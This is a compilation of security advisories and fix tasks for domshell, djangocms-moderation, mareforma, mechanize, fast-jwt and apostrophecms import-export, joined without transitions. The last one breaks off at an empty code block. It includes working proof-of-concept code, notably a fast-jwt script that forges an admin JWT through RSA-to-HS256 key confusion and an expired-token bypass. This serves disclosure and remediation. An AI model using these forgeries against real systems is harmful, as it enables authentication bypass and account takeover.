The `domshell_eval` MCP tool (and the `eval` command inside `domshell_execute`) was classified as **read-tier**, allowing it to run without the `--allow-write` server flag. However, `eval` and the write-tier `js` command dispatch to the same handler in the extension and call CDP `Runtime.evaluate` with the raw expression string and no side-effect gate. Any JavaScript expression could therefore mutate DOM, window, or global state through `domshell_eval` without the operator's `--allow-write` authorization.

The tool description explicitly promised "(read-only) ... always available in read-only mode" — the misclassification contradicted the documented contract, not just an implicit one.

### Impact

No new capability was exposed — the same write access was already available via `domshell_js` with `--allow-write` — but the tier misclassification meant:

- MCP hosts (Claude Desktop, Cursor, etc.) rendered the wrong approval UI (`readOnlyHint: true`)
- Server-side tier flags (`--allow-write`) misrepresented what an AI agent was actually authorized to do
- Audit logs and deny messages labeled write-tier activity as read-tier
- Downstream tools and analysis relying on the tier separation could over-trust an `eval` call

Framing: OWASP LLM Top 10 LLM06 (Excessive Agency), NIST AI RMF (tool permission boundary + human-approval fidelity), CWE-863 (Incorrect Authorization).

The reporter's main framing: **the MCP approval UI and server-side permission model can misrepresent the actual agency being granted to an AI agent.**

### Affected code paths

- `mcp-server/index.ts:113` — `WRITE_COMMANDS` excluded `eval`
- `mcp-server/index.ts:879-887` — `domshell_eval` registered with `ANNO_READ` and description asserting read-only
- `src/background/index.ts:1849-1854` — `js` and `eval` both dispatch to `handleJs(rawCode)`
- `src/background/index.ts:3282` — `handleJs` calls `cdp.evaluateJs(code)`
- `src/background/cdp_client.ts:660-667` — `evaluateJs` sends `Runtime.evaluate` with `expression: code, returnByValue: true, awaitPromise: true` and no `throwOnSideEffect` gate

### Fix

Shipped in `@apireno/domshell@2.0.8` (2026-07-08):

- `eval` added to `WRITE_COMMANDS`, aligning tier with actual capability
- `domshell_eval` MCP annotation changed from `ANNO_READ` to `ANNO_WRITE`
- Tool description and `MCP_INSTRUCTIONS` updated to remove read-only language; read-only DOM inspection needs pointed at `domshell_cat` / `domshell_text` / `domshell_find`
- Server-only patch — no Chrome Web Store submission required; extension code unchanged
- `SECURITY.md` added + GitHub Private Vulnerability Reporting enabled on the repo

### Upgrade path

```
npm install @apireno/domshell@2.0.8
```

Or, in a persistent install, restart your MCP server against the new version.

Drives that call `eval` without `--allow-write` will start receiving `Error: 'eval' requires --allow-write`. Options:

- Add `--allow-write` to the server flags if `eval`'s write capability is actually needed
- Migrate read-only inspection to `domshell_cat` / `domshell_text` / `domshell_find`
- Migrate to `domshell_js` if the caller already runs with `--allow-write` (same tier, same capability)

### Integrator impact

- **HKUDS/CLI-Anything** — unaffected; their harness doesn't invoke `eval` or `js` commands (verified by grep).
- **Kgspin QA-UX drives** — unaffected; they run with `--allow-write` for their action gates.
- **Direct Claude Desktop / Cursor sessions** — any that called `domshell_eval` without `--allow-write` will now be denied, aligning behavior with the documented contract.

<https://airiskmanagement.ca>
<info@airiskmanagement.ca>

## Summary

The Django admin views for moderation comments (`CollectionCommentAdmin` and `RequestCommentAdmin`) render the full comment body but scope access only by an attacker-controlled `id` in the URL and Django's model-level `view_*comment` permission. They perform no per-object participant check. As a result, any authenticated staff user who holds the comment *view* permission can read the comments of **any** collection or moderation request — including ones they are not a participant of — simply by supplying the target object's id.

Comments are documented and intended to be private to the participants of a collection (its author and the moderators assigned to its workflow). This advisory concerns a read/write authorization asymmetry: the write paths already enforced `request.user == obj.author`, but the read paths did not enforce any participant check.

## Details

`ModerationRequest.user_can_view_comments()` — the gate intended to protect comment reads (author **or** assigned moderator) — existed in the codebase but was never called by the comment admins. Neither `CollectionCommentAdmin` nor `RequestCommentAdmin` overrode `get_queryset`, and their `changelist_view` / `changeform_view` methods resolved the target object directly from the user-supplied id without an authorization check.

The changelists are hard-scoped to a single collection / moderation request (they `raise Http404` when no id is present), so the exposure is not "all comments at once," but any specific collection's or request's comments can be retrieved by iterating ids.

- `list_display` on both admins includes the comment `message`, so the full   body is disclosed directly in the changelist HTML.
- The individual changeform (`.../<id>/change/`) discloses the same content   via a direct URL.

## Impact

- **Type:** Information disclosure / broken object-level authorization (IDOR).
- **Confidentiality:** Comment contents of collections/requests the user does   not participate in are exposed. This can include sensitive internal editorial   discussion.
- **Integrity / Availability:** No impact — comment creation, editing, and   deletion already enforced author checks and are unaffected.
- **Who is affected:** Deployments where more than one team/group of staff   reviewers holds the `view_collectioncomment` / `view_requestcomment`   permission. A reviewer of collection A can read the comments of collection B.

## Workarounds

Restrict the `view_collectioncomment` and `view_requestcomment` model permissions to trusted users only, and avoid granting them across teams that must not see each other's moderation comments. This does not fully close the issue but reduces the set of users who can exploit it. Upgrading is the only complete fix.

## Remediation

Upgrade to djangocms-moderation 2.4.1.

The fix adds a `user_can_view_comments` participant gate (author or assigned moderator) to both comment admins, enforced in `changelist_view` and `changeform_view` for both the collection and request comment models. A `ModerationCollection.user_can_view_comments()` method was added to mirror the existing `ModerationRequest.user_can_view_comments()`. Non-participants now receive an HTTP 403 (`PermissionDenied`).

### Summary

`mareforma` 0.3.3 contains a critical integrity flaw in the REPLICATED convergence logic (`_maybe_update_replicated_unlocked()` in `mareforma/db/core.py:1300-1319`). The peer-selection SQL query that determines whether two independent claims "agree" on the same anchor does not verify that either claim carries a valid cryptographic signature from an enrolled validator key. Because `rekor_enabled=False` is the default and automatically sets `transparency_logged=1` at insert time, every claim — signed or not — immediately satisfies the convergence precondition. An attacker with no Mareforma key can write an unsigned claim to a shared graph, cause it to converge with a legitimate signed peer claim, and have it promoted to `REPLICATED` status. The forged `REPLICATED` row is then returned by the default trust query (`graph.query(min_support="REPLICATED")`), allowing the attacker to inject false trust signals into any downstream consumer relying on `REPLICATED` as a multi-party endorsement guarantee.

### Details

**Root cause — `mareforma/db/core.py:1300-1319`**

The convergence function `_maybe_update_replicated_unlocked()` selects peer claims using a SQL query that filters on `status`, `unresolved`, `transparency_logged`, and `artifact_hash`, but contains no predicate on `signature_bundle` or enrolled-key identity:

```python
# mareforma/db/core.py:1300-1319
rows = conn.execute(
    f"""
    SELECT DISTINCT c.claim_id, c.generated_by
    FROM claims c, json_each(c.supports_json) j
    WHERE j.value IN ({placeholders})
      AND c.claim_id != ?
      AND c.generated_by != ?
      AND c.support_level != 'ESTABLISHED'
      AND c.status = 'open'
      AND c.unresolved = 0
      AND c.transparency_logged = 1
      AND (
          c.artifact_hash IS NULL
          OR ? IS NULL
          OR c.artifact_hash = ?
      )
    """,
```

Once peer rows are collected, the sink at `core.py:1324-1334` promotes all matching claim IDs — including the attacker's — to `REPLICATED` without any additional validation.

**Why the preconditions are trivially satisfied**

1. **`transparency_logged = 1` is set automatically.** When `rekor_enabled=False` (the library default), `core.py:1061` sets `transparency_logged = 1` immediately after insert. There is no Rekor step, so every claim becomes convergence-eligible the moment it is written.
2. **`require_signed=False` is the default.** `mareforma/__init__.py:41` defaults `require_signed` to `False`. When the attacker opens the graph with a non-existent key path, `__init__.py:132-138` silently sets `signer = None`, enabling unsigned claim insertion.
3. **`assert_claim()` performs no signature gate.** `_graph.py:284-291` only validates DOI resolution on the `supports` list before forwarding attacker-controlled fields to `_db.add_claim()` (`_graph.py:373-380`).

**Why the forged claim surfaces in trust queries**

The default query path at `core.py:3647-3650` filters out only `PRELIMINARY` claims whose generator is not enrolled. Claims at `REPLICATED` status are returned unconditionally, so the unsigned forged row is indistinguishable from a legitimately converged row in any downstream consumer.

**The helper that should have been called**

`core.py:3661-3669` contains `_extract_signature_bundle_keyid()`, which can extract the key ID from a `signature_bundle`. This helper exists but is never invoked on the convergence path, indicating the validation was inadvertently omitted rather than a design decision.

**Complete data flow (source → sink)**

| Step | Location | Description |
|------|----------|-------------|
| 1 | `cli.py:700-739` | CLI accepts arbitrary `TEXT`, `--supports`, `--generated-by`; lines 720-723 explicitly permit unsigned graph mode |
| 2 | `__init__.py:128-138` | Missing key file → `signer = None` (no error raised) |
| 3 | `_graph.py:284-291` | `assert_claim()` forwards user-controlled `supports` after DOI check only |
| 4 | `_graph.py:373-380` | Calls `_db.add_claim()` with attacker-controlled claim fields |
| 5 | `db/core.py:1208-1214` | Post-insert convergence triggered when `unresolved == False` and `transparency_logged == 1` |
| 6 | `db/core.py:1300-1319` | **Peer-selection SQL — no `signature_bundle` or enrolled-key check (vulnerable sink)** |
| 7 | `db/core.py:1324-1334` | Updates peer and attacker claims to `REPLICATED` |
| 8 | `db/core.py:3647-3650` | Default query returns `REPLICATED` rows without signature validation |

```diff

@@
-    new_status_row = conn.execute(
-        "SELECT status FROM claims WHERE claim_id = ?", (new_claim_id,),

+        (new_claim_id,),

+    new_keyid = _extract_signature_bundle_keyid(new_status_row["signature_bundle"])
+    if new_keyid is None or not _validators.is_enrolled(conn, new_keyid):
+        return
@@
-        SELECT DISTINCT c.claim_id, c.generated_by
+        SELECT DISTINCT c.claim_id, c.generated_by, c.signature_bundle
@@

+    for row in rows:
+        peer_keyid = _extract_signature_bundle_keyid(row["signature_bundle"])
+        if peer_keyid is None or peer_keyid == new_keyid:
```

### Impact

This is an **integrity bypass** vulnerability (CWE-347: Improper Verification of Cryptographic Signature). `REPLICATED` is mareforma's primary multi-party trust signal, intended to convey that at least two independent, enrolled validators have independently observed and signed the same result. **Who is impacted:** Any user or system that queries a mareforma graph with `min_support="REPLICATED"` and treats the result as evidence of multi-party validation. Because the forged claim is indistinguishable from a legitimately converged claim in query results, consumers cannot detect the attack without out-of-band inspection of `signature_bundle` and `generator_enrolled` fields — fields that the library's default query interface does not surface prominently.

The vulnerability is exploitable in the default configuration: `require_signed=False`, `rekor_enabled=False`. The attack requires only local write access to a shared graph database (e.g., a shared filesystem or writable network mount) and no Mareforma key.

## What's wrong

During restore, `transparency_logged` is recomputed as `1 if (toml_logged is not False and bundle_has_rekor) else 0`, where `bundle_has_rekor` comes only from a `rekor.uuid` field inside `signature_bundle`. That derivation is wrong in both directions.

First, the rekor block is metadata attached after signing (`attach_rekor_entry` in `mareforma/signing/rekor.py` leaves the payload and signatures untouched), so it is not covered by the Ed25519 signature. A hand-edited `claims.toml` can add `"rekor": {"uuid": "x"}` to any claim's bundle and forge the "publicly witnessed by Rekor" state. The claim signature still verifies, and restore never cross-checks the block against `[rekor_inclusions]` or the log. Tampering with `claims.toml` is the exact threat model restore defends against; `_verify_claim_signatures_on_restore` checks only payload and signatures.

Second, a signed claim in a graph that never used Rekor is written with `transparency_logged=1` (the column default when Rekor is disabled) but restores as 0 because its bundle has no rekor block. The convergence gate requires `transparency_logged = 1`, so post-restore peers can no longer converge to REPLICATED. With no `rekor_url` configured, `refresh_unsigned()` is a no-op and the flag stays 0 forever. Observed on the honest path: signed non-Rekor claim restores from `transparency_logged=1` to 0, and a subsequent peer stays at PRELIMINARY instead of converging.

## Severity and impact

**High.** An attacker who edits `claims.toml` can mark claims Rekor-witnessed and REPLICATED-eligible without them ever having been logged. Meanwhile the common honest configuration (signed, no Rekor) has its trust state silently degraded by every catastrophic-loss restore, with no recovery path.

## Location

- `mareforma/db/restore.py:376` reads `toml_logged` from the TOML and probes the bundle for a `rekor.uuid`
- `mareforma/db/restore.py:385` computes `resolved_transparency` from the unsigned rekor block alone
- `mareforma/db/core.py:1401` the REPLICATED convergence gate requires `c.transparency_logged = 1`

Do not derive `transparency_logged` from an unsigned envelope field. When a rekor block is present, require a matching, cryptographically verified `[rekor_inclusions]` entry (via `verify_rekor_inclusion` against the pinned log public key) whose hashedrekord `spec.data.hash` equals the SHA-256 of the claim's signed payload before setting 1; otherwise set 0.

When the claim is signed and neither the bundle nor the graph carries Rekor coordinates, restore the write-time value: the TOML omits `transparency_logged` unless it was 0, so treat an absent flag plus no rekor bundle as 1 (the column default for non-Rekor writes).

Do red/green TDD: add a regression test that fails on `main`, then make it pass.

SOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.

## What's wrong

`verify_bundle` documents that it verifies "a bundle's DSSE envelope AND each per-claim signature", lists "per-claim signature failure" among its raised errors, and promises that partial verification never surfaces "an authenticated bundle that contains some invalid claims" as success. The code does not do this. The JSON-LD predicate built by `JSONLDExporter._claim_node` carries no signature material (there is no `signatureBundle` field on the node), so the verify loop has nothing cryptographic to check per claim. It only re-derives each claim's canonical-statement digest from the node fields and compares it to the signed subject list:

```python
chain_input = _signing.canonical_statement({...node fields...}, node.get("evidence") or {})
expected = hashlib.sha256(chain_input).hexdigest()
if subjects[subject_name] != expected:
    raise BundleVerificationError(...)
```

That digest check is self-referential: the exporter signs both the subject digests and the predicate nodes with the same key. It confirms the bundle is internally consistent as built, not that each claim's purported asserter ever validly signed it. The existing test `test_tampered_claim_text_in_predicate_fails` asserts a "digest mismatch", confirming digest-only verification is the actual contract.

## Severity and impact

**Medium.** All trust in a bundle collapses to the single exporter key. Whoever holds it (or a malicious exporter) can emit a bundle containing claims whose asserter signatures are missing, invalid, or forged, and `verify_bundle` returns success. A relying party reading the docstring believes per-claim authenticity was verified when it was not. Security-sensitive because this is the trust boundary the SCITT-style export exists to provide.

## Location

- `mareforma/export_bundle.py:20` module docstring claims verification checks "every per-claim signature inside predicate"

- `mareforma/exporters/jsonld.py:178` `_claim_node` emits no signature field, so the predicate carries nothing to verify per claim

Two honest options. Either export each claim's signature bundle in the JSON-LD predicate and have `verify_bundle` cryptographically verify it (including the claim_id and subject binding) against the claim's asserter or validator key, raising on the first failure as documented. Or, if per-claim verification is out of scope for the bundle format, correct the module docstring and the `verify_bundle` docstring to state exactly what is verified: the bundle-level DSSE signature plus internal subject-digest consistency, with per-claim asserter signatures explicitly not checked.

## What's wrong

`search_claims` never calls `_row_verified_on_read`. Its row loop applies only the PRELIMINARY-unenrolled filter, then appends the row. `query_claims` runs the same projection but additionally re-verifies REPLICATED/ESTABLISHED signatures on read (line 4023) and drops any row that fails, per the documented tamper guarantee in the comment block above it: a high-trust row whose signature does not verify is excluded from query results entirely.

So a tampered or forged high-trust row splits the two read paths. Any process with DB write access, or an attacker copying a genuine validation envelope onto a fresh row, can flip a row to ESTABLISHED. `query()` drops it; `search()` serves it at its persisted trust level. Verified in a runtime check against a forged ESTABLISHED row:

```
query() returns forged row: False
search() returns forged row: True   # support_level ESTABLISHED, 'verified' key absent
```

The docstring makes this worse: `search_claims` promises "the same projection as query_claims" and that the `include_unverified` filter "applies identically", so callers reasonably trust search results equally. The forged row also lacks the `verified` key entirely, so a consumer cannot tell it went unchecked.

## Severity and impact

**High.** The verify-on-read tamper exclusion is a stated trust guarantee, and search is a primary read surface. A forged ESTABLISHED finding that query correctly rejects is served by search as genuine, with no marker that verification was skipped.

## Location

- `mareforma/db/core.py:4206` search_claims row loop applies only the PRELIMINARY-unenrolled filter, then appends
- `mareforma/db/core.py:4114` search_claims signature and docstring, which claims query_claims-identical semantics
- `mareforma/db/core.py:4023` query_claims verify-on-read call that search_claims lacks

## Fix direction

Mirror `query_claims`: add a `verify_cache: dict = {}` and, inside the search_claims row loop after the include_unverified check, drop rows that fail `_row_verified_on_read(conn, d, verify_cache)`. Since the verify filter can drop rows even when `include_unverified=True`, remove the single-batch break on `include_unverified` and keep batching until `limit` survivors or the FTS5 match-set is exhausted, with the same scan ceiling `query_claims` uses. Also set `single_trust_domain` / `trust_domain_root` on surviving ESTABLISHED rows if the "same projection" promise is to hold.

Do red/green TDD: add a regression test that fails on `main`, then make it pass.

## Quality bar

SOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.

## Summary

`mechanize` leaked credentials to the redirect target when an HTTP redirect crossed to another host. Credentials set through `Mechanize#request_headers=` leaked even when they were `Authorization`.

## Details

Two defects, both in `lib/mechanize/http/agent.rb`.

**1. `Mechanize#request_headers=` bypassed the redirect strip entirely.** `#request_add_headers` copied `@request_headers` onto every request unconditionally, with no host check, including the request issued after a redirect. The strip in `#response_redirect` mutated only the per-request headers hash and never touched agent state. Because `request_headers=` is the documented way to set a default credential for every request, the header the code explicitly protected — `Authorization` — was the one most likely to leak.

**2. The strip list omitted `Proxy-Authorization` and `Cookie2`.** Only `CREDENTIAL_HEADERS = ['Authorization']` and `COOKIE_HEADERS = ['Cookie']` were removed from the per-request headers hash on a cross-host redirect.

Cookies held in `Mechanize#cookie_jar` and credentials held in `Mechanize::HTTP::AuthStore` are **not** affected. Both are looked up per-URI, so they never follow a redirect to a foreign host. The exposure was limited to headers the caller set by hand.

## PoC

```ruby
agent = Mechanize.new
agent.request_headers = { 'Authorization' => 'Bearer secret' }
agent.get('https://example.test/redirects-to-attacker')
# the request to the attacker's host carries "Authorization: Bearer secret"
```

## Impact

An attacker who controls a redirect target — through an open redirect on the site being fetched, an attacker-supplied fetch URL, DNS rebinding, or MITM — captures bearer tokens and session cookies from any `mechanize` agent that sets credentials through `request_headers=` or the per-request `headers` argument. Disclosure only; no integrity or availability impact.

## Patches

Fixed in `mechanize` v2.14.1.

- Credentials and cookies are withheld from a request that follows a redirect across an origin, from **both** header sources: the per-request `headers` argument and `Mechanize#request_headers=`.
- `CREDENTIAL_HEADERS` gains `Proxy-Authorization`; `COOKIE_HEADERS` gains `Cookie2`.

`Proxy-Authorization` is withheld here although curl does not withhold it, because `Net::HTTP` tunnels `https:` requests with `CONNECT`, so a caller-supplied `Proxy-Authorization` travels inside the tunnel to the origin server rather than to the proxy.

Headers set through `Mechanize#request_headers=` no longer reach a redirect target on another origin when they are credentials. Callers that relied on the previous behavior will see those headers withheld.

### What this fix does not cover

Only the headers in `CREDENTIAL_HEADERS` and `COOKIE_HEADERS` are withheld. A caller-supplied header that carries a credential under some other name — `X-API-Key`, `X-Vault-Token`, or any bespoke token header — still follows a redirect to another origin, matching the behavior of curl's `CURLOPT_HTTPHEADER`. If you set such a header, do not enable redirect following for requests that carry it, or scope it to a single request whose destination you control.

## Workarounds

Set `Mechanize#redirect_ok = false` and handle redirects explicitly, or avoid `request_headers=` for credentials and pass them per-request only to hosts you intend to authenticate to.

## Credit

Reported by @SnailSploit.

### Summary

The fix for CVE-2026-34950 (CVSS 9.1, released in v6.2.0) is **incomplete**. It adds `key.trim()` to the PEM-detection path in `src/crypto.js`, but `String.prototype.trim()` only strips characters classified as whitespace by the ECMAScript specification. The subsequent `^`-anchored regex (`/^-----BEGIN(?: (RSA))? PUBLIC KEY-----/`) still requires the PEM header at position 0 — so **any non-whitespace leading byte** (control chars, zero-width unicode, `#` comments, HTTP-style headers, PGP wrappers) bypasses detection and falls through to the HMAC verification path, using the RSA public key as the HMAC shared secret. Net result: the **exact same RSA→HS256 algorithm-confusion attack** the original CVE addressed is fully re-enabled with a slightly different leading byte.

**Attack prerequisites are identical to CVE-2026-34950**: attacker knows the target's public RSA key (which is public by definition), and the target loads that key from a source whose content may have a non-whitespace prefix (DB column with corrupted encoding, YAML config with inline comment, copy-paste from formatted document, etc.).

**Verified on fast-jwt@6.2.2 (latest as of 2026-04-23) with a 10-line PoC.**

### Details

Post-patch code (`src/crypto.js`, lines ~74-171 in `performDetectPublicKeyAlgorithms`):

```js
function performDetectPublicKeyAlgorithms(key) {
    const trimmedKey = key.trim()  // <-- CVE-2026-34950 patch added this
    if (publicKeyPemMatcher.test(trimmedKey)) {
        // treat as RSA/EC public key
        ...
    }
    // fall-through: treat as HMAC secret  <-- bug: reachable via non-whitespace prefix
    ...
}
const publicKeyPemMatcher = /^-----BEGIN(?: (RSA))? PUBLIC KEY-----/
```

**The bug**: `String.prototype.trim()` only strips whitespace (U+0009-U+000D, U+0020, U+00A0, U+1680, U+2000-U+200A, U+2028-U+2029, U+202F, U+205F, U+3000, U+FEFF). Non-whitespace leading bytes keep the PEM header off position 0, the `^`-anchored regex fails, and execution falls through to the HMAC path with `key` being used as the shared secret. The attacker controls the token signature (signed with the same public key) and the verifier accepts.

Identical root cause as CVE-2026-34950 — the fix was textually narrow (whitespace only) rather than addressing the class (any surrounding content).

### PoC

```js
'use strict';
const { createHmac, generateKeyPairSync } = require('node:crypto');
const { createVerifier } = require('fast-jwt');

const { publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
const pem = publicKey.export({ type: 'pkcs1', format: 'pem' }).toString();

// Attacker-controlled "key" content as loaded by the verifier
// (models a realistic deployment: key with a leading metadata comment)
const key = '# some comment\n' + pem;

const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
const payload = Buffer.from(JSON.stringify({ admin: true, sub: 'attacker' })).toString('base64url');
const sig = createHmac('sha256', key).update(header + '.' + payload).digest('base64url');
const forgedToken = header + '.' + payload + '.' + sig;

const verifier = createVerifier({ key });
console.log('Forged token payload:', verifier(forgedToken));
console.log('Package version:', require('fast-jwt/package.json').version);
```

**Observed output (2026-04-23, fresh npm install):**
```
Forged token payload: { admin: true, sub: 'attacker' }
Package version: 6.2.2
```

### Full bypass matrix (all verified accepting a forged admin token)

| Leading content | Accepted as admin? |
|---|:-:|
| `# some comment\n` + PEM | ✅ BYPASS |
| `U+0000` (NUL) + PEM | ✅ BYPASS |
| `U+0001` (SOH) + PEM | ✅ BYPASS |
| `U+0008` (BACKSPACE) + PEM | ✅ BYPASS |
| `U+001B` (ESC, ANSI-color) + PEM | ✅ BYPASS |
| `U+007F` (DEL) + PEM | ✅ BYPASS |
| `U+200B` (ZWSP) + PEM | ✅ BYPASS |
| `U+200D` (ZWJ) + PEM | ✅ BYPASS |
| `HTTP/1.1 200 OK\r\n\r\n` + PEM | ✅ BYPASS |
| PGP-wrapper text + PEM | ✅ BYPASS |
| `.` + PEM | ✅ BYPASS |
| `U+FEFF` (BOM) + PEM | ❌ correctly stripped by trim |

### Defense matrix (which caller configs are vulnerable)

| Caller config | Vulnerable? |
|---|:-:|
| `createVerifier({ key })` (no `algorithms` allowlist) | ✗ VULNERABLE |
| `createVerifier({ key: asyncCallback })` | ✗ VULNERABLE |
| `createVerifier({ key, algorithms: ['RS256'] })` | ✓ protected |
| `createVerifier({ key, algorithms: ['HS256'] })` | ✗ VULNERABLE (attacker matches) |

### Impact

1. **Authentication bypass** — attacker forges arbitrary JWT claims (admin, tenant-id, user-id) accepted by any server using fast-jwt 6.2.x without an `algorithms` allowlist AND loading its verification key from a source that may contain non-whitespace prefix bytes.
2. **Severity-parity with CVE-2026-34950** — attack chain, prerequisites, exploitation ease, and impact are identical; only the trigger byte differs. The fix addressed *one* trigger (whitespace) rather than the class (any surrounding content before `-----BEGIN`).
3. **Broad fast-jwt deployment** — default JWT backend of `@fastify/jwt`; used by many Fastify-based Node.js APIs.

### Suggested fix

**Option A (minimal)** — locate the PEM block rather than anchoring on position 0:

```js
const pemStart = trimmedKey.indexOf('-----BEGIN')
if (pemStart !== -1 && publicKeyPemMatcher.test(trimmedKey.slice(pemStart))) { ... }
```

**Option B (strict, recommended)** — require the key to be exactly a PEM block:

```js
const pemMatch = /-----BEGIN (RSA )?PUBLIC KEY-----[\s\S]+?-----END \1?PUBLIC KEY-----/.exec(trimmedKey)
if (pemMatch && pemMatch[0].trim() === trimmedKey.trim()) { /* valid PEM, no surrounding content */ }
```

**Option C (defense-in-depth, regardless of A/B)** — on the HMAC fallback path, reject any key that *contains* PEM markers:

```js
if (rawKey.includes('-----BEGIN') || rawKey.includes('-----END')) {
    throw new Error('Key appears to be a PEM-encoded asymmetric key but did not match expected format; refusing HMAC fallback')
}
```

### Test coverage gap

`test/crypto.spec.js` post-CVE-2026-34950 only tests whitespace padding (`['\n', ' ', ' \n', '\n ', '\t\t']`). Add coverage for:
- Control bytes (U+0000-U+001F, U+007F)
- Zero-width Unicode (U+200B, U+200C, U+200D, U+180E)
- Comment prefixes (`#`, `//`, `;`, `--`)
- Mixed-content wrappers (PGP blocks, HTTP headers)
- Arbitrary binary prefix bytes

### Credit

Reporter: DC INFOSEC / n0l3x — source-code review + end-to-end PoC verification.

## Summary

`createVerifier({ clockTolerance: Infinity })` silently bypasses both `exp` (expiry) AND `nbf` (not-before) validation. Any expired or not-yet-active token is accepted as valid. The same primitive also corrupts the verifier's internal cache so cached entries inherit infinite validity — they remain valid past a later developer-removed Infinity config until LRU eviction.

## Vulnerable code

`src/verifier.js:531-533` — option validation only rejects negative values, not Infinity:

```js
if (clockTolerance && (typeof clockTolerance !== 'number' || clockTolerance < 0)) {
  throw new TokenError(TokenError.codes.invalidOption, 'The clockTolerance option must be a positive number.')
}
```

`Infinity` passes (it's a number, not less than 0, truthy).

`src/verifier.js:583-602` — clockTolerance flows into the date-claim validators:

```js
if (!ignoreNotBefore) {
  validators.push({ ..., modifier: -clockTolerance })   // → -Infinity
}
if (!ignoreExpiration) {
  validators.push({ ..., modifier: +clockTolerance })   // → Infinity
}
```

`src/verifier.js:198-205` — applies modifier additively, producing always-pass comparisons:

```js
function validateClaimDateValue(value, modifier, now, greater, errorCode, errorVerb) {
  const adjusted = value * 1000 + (modifier || 0)   // → ±Infinity
  const valid = greater ? now >= adjusted : now <= adjusted   // �� always true
  ...
}
```

## Empirical PoC

```js
const { createSigner, createVerifier } = require('fast-jwt')
const secret = 'test-secret-with-enough-length-to-pass'

const sign = createSigner({ key: secret, algorithm: 'HS256' })
const expiredToken = sign({
  sub: 'alice',
  iat: Math.floor(Date.now()/1000) - 3600,
  exp: Math.floor(Date.now()/1000) - 1800,  // expired 30 min ago
})

const v1 = createVerifier({ key: secret })
try { v1(expiredToken) } catch (e) { console.log('baseline rejects:', e.message) }
// → "The token has expired at ..."

const v2 = createVerifier({ key: secret, clockTolerance: Infinity })
console.log('bypass:', v2(expiredToken))
// → { sub: 'alice', iat: ..., exp: ... }  ← expired token accepted as valid

// Not-yet-active token (nbf in 1 day) — same bypass
const futureToken = sign({
  sub: 'bob',
  iat: Math.floor(Date.now()/1000),
  nbf: Math.floor(Date.now()/1000) + 86400,
})
console.log('bypass nbf:', v2(futureToken))
// → { sub: 'bob', ... }  ← not-yet-active token accepted as valid
```

Verified against `fast-jwt@HEAD` on 2026-06-03 (commit pulled today).

## Cache side-effect

The verifier's LRU cache uses `clockTolerance` to compute the cache entry's expiry window:

`src/verifier.js:121-134`:
```js
cacheValue[1] = ... payload.nbf * 1000 - clockTolerance : 0                   // → -Infinity
cacheValue[2] = payload.exp * 1000 + clockTolerance                            // → Infinity
const maxTTL = clockTimestamp + clockTolerance + cacheTTL                      // → Infinity
```

With `clockTolerance: Infinity`, cache entries are stored with `[min=-Infinity, max=Infinity]`. The cache-hit check (`min === 0 || now < min || now <= max`) always passes for cached tokens.

**Consequence**: a developer who briefly sets `clockTolerance: Infinity` (e.g., during debug) and then removes it will find that any verifications performed during the debug window remain cached as valid until LRU eviction (default 1000 entries).

## Asymmetric hardening — the smoking-gun shape

`src/signer.js:98, 104` CORRECTLY uses `Number.isFinite()` to reject Infinity for `expiresIn` and `notBefore`:

```js
expiresIn != null && Number.isFinite(expiresIn)
  ? Math.floor((iat + expiresIn) / 1000)
  : ...
```

The verifier's `clockTolerance` validation doesn't apply the same guard. The same `< 0` check pattern is also applied to `clockTimestamp` (line 527-529) and `cacheTTL` (line 535-537) — both also accept `Infinity`.

This is the kind of asymmetry that often indicates a missed hardening pass: the sign-side was hardened against Infinity but the verify-side wasn't.

## Threat model

The bug requires the developer to (mis)configure `clockTolerance: Infinity`. Realistic ways this happens:

1. **Developer using Infinity as a sentinel** for "disable expiry": common JS idiom; many libraries accept Infinity as "no limit." fast-jwt's signer treats Infinity as invalid (Number.isFinite false) but the verifier silently accepts it.
2. **JSON / env-var misconfig**: config file or env var sets `clockTolerance` to `"Infinity"` (string); `Number("Infinity") === Infinity`. Surprising via JSON.parse + Number cast or even `JSON.parse('{"clockTolerance": null}')` if the codec accepts null → Infinity.
3. **Test config bleed**: integration tests use Infinity to make tokens never expire during long-running tests; the config bleeds into production.

For a JWT library, silently disabling token expiry on a "looks like a non-negative number" input is a security boundary failure.

## Suggested fix

Single-line addition: use `Number.isFinite()` consistent with signer.js:

```js
if (clockTolerance && (typeof clockTolerance !== 'number' || !Number.isFinite(clockTolerance) || clockTolerance < 0)) {
  throw new TokenError(TokenError.codes.invalidOption, 'The clockTolerance option must be a finite, non-negative number.')
}
```

Same fix for `clockTimestamp` (line 527-529) and `cacheTTL` (line 535-537) for consistency.

Optional defense-in-depth: cap `clockTolerance` to a reasonable upper bound (e.g., 5 minutes = 300000 ms) with a `process.emitWarning` above that. Most legitimate use cases need <60s tolerance.

## Affected versions

All versions since clockTolerance was first introduced in PR #193 (v1.5.1). Current `main` HEAD on 2026-06-03 is affected.

## Reporter

Andrew Ridings (independent security researcher). Happy to coordinate disclosure timing and follow up with any clarifications. Email: ridingsa@gmail.com

### Summary

The tar-extraction guard added to `@apostrophecms/import-export` for GHSA-mwxc-m426-3f78 is a literal substring test for `../`, and `./..` does not contain that substring. An entry named `./..` therefore passes the guard, `path.join` normalizes it to the parent of the export directory, and the resulting `fs.WriteStream` opens a directory and emits `EISDIR` with no `error` listener attached, which terminates the Node process.

Confirmed on default-branch HEAD `1bd5d0a7a6fe880836fa75adad6964f1c577d640`, package version `3.6.2`.

### Details

`packages/import-export/lib/formats/gzip.js`, in the tar-stream `entry` handler inside `extract(filepath, exportPath)`:

```js
const name = header.name.replace(/\\/g, '/');
if (name.includes('../')) {
  // skipped
}
...
stream.pipe(fs.WriteStream(path.join(exportPath, name)));
```

Two separate problems sit in those four lines. The guard tests the raw entry name for a substring instead of resolving the joined path and requiring containment, and the write stream has no `error` handler, so any stream error becomes an unhandled `'error'` event.

Reaching it needs an account that can import, nothing more. `packages/import-export/modules/@apostrophecms/import-export-page/index.js` exposes `post.importExportImport`, which calls into `lib/methods/import.js`; that handler requires `req.user` and then calls `format.input(exportPath)`, which for a `.gz` upload is `gzip.js` calling `extract()` on the uploaded archive.

### PoC

This is not an end-to-end exploit. What follows is each of the three primitives the crash depends on, executed individually, plus a source-level trace of the route. The chain from `post.importExportImport` to `extract()` was read, not observed.

The guard misses the payload:

```bash
